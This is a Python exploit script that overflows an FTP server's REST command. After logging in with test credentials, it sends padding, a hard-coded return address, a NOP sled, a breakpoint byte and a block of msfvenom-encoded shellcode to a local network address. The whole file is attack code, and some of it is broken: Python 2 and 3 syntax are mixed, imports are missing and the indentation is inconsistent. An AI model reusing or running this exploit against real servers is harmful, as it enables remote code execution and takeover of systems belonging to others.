#!/usr/bin/env python3

import socket
import struct

HOST = '192.168.xxx.xxx'  # The server's hostname or IP address
PORT = 21        # The port used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 246
buffer += '\xd7\x30\x9d\x7c'
buffer += '\x90'*20

buffer += '\xcc'
buf =  b""
buf += b"\xb8\xa7\x24\x33\xa9\xd9\xeb\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\xe0\x2a\xd1"
buf += b"\x5c\x12\xda\x97\x9f\xea\x1b\xf8\x16\x0f\x2a\x38\x4c"
buf += b"\x44\x1d\x88\x06\x08\x92\x63\x4a\xb8\x21\x01\x43\xcf"
buf += b"\x82\xac\xb5\xfe\x13\x9c\x86\x61\x90\xdf\xda\x41\xa9"
buf += b"\x2f\x2f\x80\xee\x52\xc2\xd0\xa7\x19\x71\xc4\xcc\x54"
buf += b"\x4a\x6f\x9e\x79\xca\x8c\x57\x7b\xfb\x03\xe3\x22\xdb"
buf += b"\xa2\x20\x5f\x52\xbc\x25\x5a\x2c\x37\x9d\x10\xaf\x91"
buf += b"\xef\xd9\x1c\xdc\xdf\x2b\x5c\x19\xe7\xd3\x2b\x53\x1b"
buf += b"\x69\x2c\xa0\x61\xb5\xb9\x32\xc1\x3e\x19\x9e\xf3\x93"
buf += b"\xfc\x55\xff\x58\x8a\x31\x1c\x5e\x5f\x4a\x18\xeb\x5e"
buf += b"\x9c\xa8\xaf\x44\x38\xf0\x74\xe4\x19\x5c\xda\x19\x79"
buf += b"\x3f\x83\xbf\xf2\xd2\xd0\xcd\x59\xbb\x15\xfc\x61\x3b"
buf += b"\x32\x77\x12\x09\x9d\x23\xbc\x21\x56\xea\x3b\x45\x4d"
buf += b"\x4a\xd3\xb8\x6e\xab\xfa\x7e\x3a\xfb\x94\x57\x43\x90"
buf += b"\x64\x57\x96\x37\x34\xf7\x49\xf8\xe4\xb7\x39\x90\xee"
buf += b"\x37\x65\x80\x11\x92\x0e\x2b\xe8\x75\xf1\x04\xf3\xfe"
buf += b"\x99\x56\xf3\x11\x06\xde\x15\x7b\xa6\xb6\x8e\x14\x5f"
buf += b"\x93\x44\x84\xa0\x09\x21\x86\x2b\xbe\xd6\x49\xdc\xcb"
buf += b"\xc4\x3e\x2c\x86\xb6\xe9\x33\x3c\xde\x76\xa1\xdb\x1e"
buf += b"\xf0\xda\x73\x49\x55\x2c\x8a\x1f\x4b\x17\x24\x3d\x96"
buf += b"\xc1\x0f\x85\x4d\x32\x91\x04\x03\x0e\xb5\x16\xdd\x8f"
buf += b"\xf1\x42\xb1\xd9\xaf\x3c\x77\xb0\x01\x96\x21\x6f\xc8"
buf += b"\x7e\xb7\x43\xcb\xf8\xb8\x89\xbd\xe4\x09\x64\xf8\x1b"
buf += b"\xa5\xe0\x0c\x64\xdb\x90\xf3\xbf\x5f\xa0\xb9\x9d\xf6"
buf += b"\x29\x64\x74\x4b\x34\x97\xa3\x88\x41\x14\x41\x71\xb6"
buf += b"\x04\x20\x74\xf2\x82\xd9\x04\x6b\x67\xdd\xbb\x8c\xa2"


buffer += buf

#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1712 bytes
print(buffer+'\n')

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.139',21))
	data = s.recv(1024)
        print("Connessione: "+ data)
        s.send('USER test \r\n')
	data = s.recv(1024)
        print("Login: " + data)
        s.send('PASS test \r\n')
	data = s.recv(1024)
        print("Password: ",data)
	s.send('REST ' + buffer + '\r\n')
        s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(('192.168.xxx.xxx',21))
	sleep(1)
	s.close()
	print "\nDone!"
except:
	print "Could not connect to FTP!"

